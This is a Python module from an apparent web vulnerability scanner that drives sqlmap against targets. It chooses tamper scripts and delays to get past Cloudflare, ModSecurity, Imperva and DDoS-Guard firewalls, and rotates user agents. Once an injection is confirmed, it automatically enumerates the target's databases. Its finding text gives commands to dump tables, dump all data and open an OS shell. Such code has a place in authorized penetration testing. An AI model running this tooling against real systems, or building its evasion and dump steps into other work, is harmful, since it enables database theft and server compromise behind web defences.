"""sqlmap integration — secondary SQLi pass for WAF-protected targets.

Runs sqlmap with pre-tuned Cloudflare/WAF bypass flags and normalises its
output into native Finding objects. Only called when:
  - config["use_sqlmap"] is True, OR
  - config["ext_tools"] is True
  - and the primary scanner found 0 SQLi findings.
"""

import logging
import os
import re
import subprocess
import tempfile
from typing import Dict, List, Optional

from ..modules.base import Finding

logger = logging.getLogger("vulnscanner")

# ---------------------------------------------------------------------------
# Tamper script profiles keyed on WAF name (lower-case substring match)
# ---------------------------------------------------------------------------
_WAF_TAMPERS: Dict[str, List[str]] = {
    "cloudflare": [
        "between", "charunicodeencode", "space2comment",
        "randomcase", "chardoubleencode",
    ],
    "modsecurity": [
        "between", "space2comment", "randomcase", "chardoubleencode",
    ],
    "imperva": [
        "between", "charunicodeencode", "space2comment", "randomcase",
    ],
    "ddos-guard": [
        "between", "space2comment", "randomcase",
    ],
    "generic": [
        "between", "space2comment", "randomcase",
    ],
}

# Regex patterns to parse sqlmap's text output.
_RE_VULN_PARAM   = re.compile(r"^Parameter:\s+(\S+)\s+\((\w+)\)", re.M)
_RE_INJECT_TYPE  = re.compile(r"^\s+Type:\s+(.+)$", re.M)
_RE_INJECT_TITLE = re.compile(r"^\s+Title:\s+(.+)$", re.M)
_RE_PAYLOAD      = re.compile(r"^\s+Payload:\s+(.+)$", re.M)
_RE_DBMS         = re.compile(r"back-end DBMS:\s+(.+)", re.I)
_RE_DB_LIST      = re.compile(r"\[\*\]\s+(\S+)\s*$", re.M)

# User-agents to rotate (avoids the default sqlmap UA which WAFs block).
_RANDOM_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.4",
]


def _extract_dbms(text: str) -> Optional[str]:
    """Extract DBMS string from sqlmap output."""
    m = _RE_DBMS.search(text)
    return m.group(1).strip() if m else None


def _pick_tampers(waf_name: str) -> List[str]:
    waf_lower = (waf_name or "").lower()
    for key, tampers in _WAF_TAMPERS.items():
        if key in waf_lower:
            return tampers
    return _WAF_TAMPERS["generic"]


def _build_command(
    url: str,
    param: Optional[str],
    method: str,
    data: str,
    waf_name: str,
    waf_evasion: int,
    dbms: Optional[str],
    cookies: str,
    proxy: Optional[str],
    output_dir: str,
    extra_headers: Dict[str, str],
    timeout: int,
    delay: float,
) -> List[str]:
    cmd = [
        "sqlmap",
        "-u", url,
        "--batch",                # never ask for user input
        "--output-dir", output_dir,
        "--level", "5",
        "--risk", "3",
        "--random-agent",
        "--retries", "3",
        "--timeout", str(timeout),
        "--technique", "BEUSTQ",  # all techniques
    ]

    if param:
        cmd += ["-p", param]
    if method.upper() == "POST" and data:
        cmd += ["--method", "POST", "--data", data]
    if dbms:
        cmd += ["--dbms", dbms]
    if cookies:
        cmd += ["--cookie", cookies]
    if proxy:
        cmd += ["--proxy", proxy]
    if delay > 0:
        cmd += ["--delay", str(delay)]

    # Extra headers (Authorization, X-Bug-Bounty, etc.)
    for k, v in (extra_headers or {}).items():
        if k.lower() == "user-agent":
            continue  # --random-agent handles UA
        cmd += ["-H", f"{k}: {v}"]

    # WAF tamper scripts (only when evasion is enabled or WAF detected)
    if waf_evasion > 0 or waf_name:
        tampers = _pick_tampers(waf_name)
        if waf_evasion >= 2:
            tampers = list(dict.fromkeys(tampers + ["chardoubleencode", "charunicodeescape"]))
        if waf_evasion >= 3:
            tampers = list(dict.fromkeys(tampers + ["equaltolike", "greatest", "ifnull2ifisnull"]))
        cmd += ["--tamper", ",".join(tampers)]

    # For a strong Cloudflare bypass, add a realistic delay between requests.
    if "cloudflare" in (waf_name or "").lower() and delay == 0:
        cmd += ["--delay", "2"]

    return cmd


def _parse_output(text: str, url: str) -> List[Finding]:
    """Parse sqlmap's text output into Finding objects."""
    findings: List[Finding] = []

    dbms_match = _RE_DBMS.search(text)
    dbms = dbms_match.group(1).strip() if dbms_match else "unknown DBMS"

    # Split into parameter blocks (one block per injectable parameter).
    blocks = re.split(r"(?=^Parameter:\s)", text, flags=re.M)
    for block in blocks:
        param_m = _RE_VULN_PARAM.search(block)
        if not param_m:
            continue
        param_name = param_m.group(1)
        method = param_m.group(2).upper()

        types  = _RE_INJECT_TYPE.findall(block)
        titles = _RE_INJECT_TITLE.findall(block)
        payloads = _RE_PAYLOAD.findall(block)

        for i, inj_type in enumerate(types):
            title   = titles[i].strip() if i < len(titles) else inj_type
            payload = payloads[i].strip() if i < len(payloads) else ""
            findings.append(Finding(
                vuln_type=f"SQL Injection ({inj_type.strip()}) [sqlmap]",
                url=url,
                method=method,
                parameter=param_name,
                payload=payload,
                evidence=f"sqlmap confirmed: {title} — {dbms}",
                confidence="high",
                details=(
                    f"sqlmap confirmed a {inj_type.strip()} SQL injection "
                    f"on parameter '{param_name}'. "
                    f"Back-end DBMS: {dbms}. "
                    f"Use sqlmap --dump to extract data."
                ),
                reproduction=(
                    f"# Confirmed by sqlmap (technique: {inj_type.strip()}):\n"
                    f"$ sqlmap -u '{url}' -p {param_name} "
                    f"--dbms {dbms.split()[0] if dbms != 'unknown DBMS' else 'mysql'} "
                    f"--batch --dump\n"
                    f"# Payload used:\n"
                    f"$ {payload}"
                ),
            ))

    return findings


class SqlmapRunner:
    """Run sqlmap against a target and return normalised Finding objects."""

    def __init__(self, config: Dict) -> None:
        self.config = config

    def run(
        self,
        url: str,
        param: Optional[str] = None,
        waf_name: str = "",
        dbms: Optional[str] = None,
        override_method: str = "",
        override_data: str = "",
    ) -> List[Finding]:
        from . import is_available
        if not is_available("sqlmap"):
            logger.warning("[sqlmap] not found on PATH — skipping.")
            return []

        method   = (override_method or self.config.get("method", "GET")).upper()
        data     = override_data or self.config.get("data") or ""
        cookies_d = self.config.get("cookies") or {}
        cookies_s = "; ".join(f"{k}={v}" for k, v in cookies_d.items())
        proxy    = self.config.get("proxy")
        # Timeout: 10 min for WAF targets, 5 min otherwise; always ≥ 60s
        hard_cap = 600 if waf_name else 300
        timeout  = max(60, self.config.get("timeout", 10) * 6)
        waf_ev   = self.config.get("waf_evasion", 0)
        headers  = {k: v for k, v in (self.config.get("headers") or {}).items()
                    if k.lower() != "user-agent"}
        delay    = float(self.config.get("rate_limit_delay") or 0)

        with tempfile.TemporaryDirectory(prefix="abaddon_sqlmap_") as out_dir:
            cmd = _build_command(
                url=url, param=param, method=method, data=data,
                waf_name=waf_name, waf_evasion=waf_ev, dbms=dbms,
                cookies=cookies_s, proxy=proxy, output_dir=out_dir,
                extra_headers=headers, timeout=timeout, delay=delay,
            )
            logger.info("[sqlmap] command: %s", " ".join(cmd))
            try:
                proc = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=hard_cap,
                )
            except subprocess.TimeoutExpired:
                logger.warning("[sqlmap] timed out after %ds.", hard_cap)
                logger.info(
                    "[sqlmap] tip: run manually with shorter technique set: "
                    "sqlmap -u '%s' --batch --technique BT --level 1 --dbs",
                    url,
                )
                return []
            except FileNotFoundError:
                logger.warning("[sqlmap] binary not found.")
                return []

            output = proc.stdout + proc.stderr
            logger.debug("[sqlmap] output:\n%s", output[:2000])

            if "not injectable" in output.lower():
                logger.info("[sqlmap] parameter confirmed NOT injectable.")
                return []

            findings = _parse_output(output, url)
            if not findings:
                logger.info("[sqlmap] no injections found.")
                return []

            logger.info("[sqlmap] %d injection(s) confirmed.", len(findings))

            # Post-exploitation: auto-enumerate databases when injection is confirmed.
            post_findings = self._run_post_exploitation(
                url=url, param=param, method=method, data=data,
                waf_name=waf_name, waf_evasion=waf_ev,
                dbms=dbms or _extract_dbms(output),
                cookies=cookies_s, proxy=proxy,
                extra_headers=headers, out_dir=out_dir,
                timeout=timeout, delay=delay,
            )
            findings.extend(post_findings)
            return findings

    def _run_post_exploitation(
        self, url: str, param: Optional[str], method: str, data: str,
        waf_name: str, waf_evasion: int, dbms: Optional[str],
        cookies: str, proxy: Optional[str], extra_headers: Dict,
        out_dir: str, timeout: int, delay: float,
    ) -> List[Finding]:
        """Run --dbs after confirming injection, then build a rich Finding."""
        dbs_cmd = _build_command(
            url=url, param=param, method=method, data=data,
            waf_name=waf_name, waf_evasion=waf_evasion, dbms=dbms,
            cookies=cookies, proxy=proxy, output_dir=out_dir,
            extra_headers=extra_headers, timeout=timeout, delay=delay,
        ) + ["--dbs"]
        logger.info("[sqlmap] post-exploitation: enumerating databases...")
        try:
            proc = subprocess.run(
                dbs_cmd, capture_output=True, text=True, timeout=min(timeout * 2, 300),
            )
        except Exception as exc:
            logger.debug("[sqlmap] --dbs failed: %s", exc)
            return []

        output = proc.stdout + proc.stderr
        dbs = _RE_DB_LIST.findall(output)
        if not dbs:
            return []

        dbms_detected = _extract_dbms(output) or dbms or "unknown"
        p = param or "param"
        data_flag = f" --data '{data}'" if data else ""
        dbms_flag = f" --dbms {dbms_detected.split()[0]}" if dbms_detected != "unknown" else ""
        base_cmd = f"sqlmap -u '{url}' -p {p}{data_flag}{dbms_flag} --batch"

        details = (
            f"sqlmap enumerated {len(dbs)} database(s) on the target:\n"
            + "  ".join(dbs)
            + f"\nBack-end DBMS: {dbms_detected}"
        )
        repro = (
            f"# Databases found: {', '.join(dbs)}\n"
            f"# Dump tables from a specific database:\n"
            f"$ {base_cmd} -D {dbs[0]} --tables\n"
            f"# Dump data from a table:\n"
            f"$ {base_cmd} -D {dbs[0]} -T <TABLE> --dump\n"
            f"# Dump all data (careful — slow):\n"
            f"$ {base_cmd} -D {dbs[0]} --dump-all\n"
            f"# Try OS shell if stacked queries are supported:\n"
            f"$ {base_cmd} --os-shell"
        )
        return [Finding(
            vuln_type="SQL Injection — DB Enumeration [sqlmap]",
            url=url,
            method=method,
            parameter=p,
            payload="--dbs",
            evidence=f"Databases: {', '.join(dbs)}",
            confidence="high",
            details=details,
            reproduction=repro,
        )]
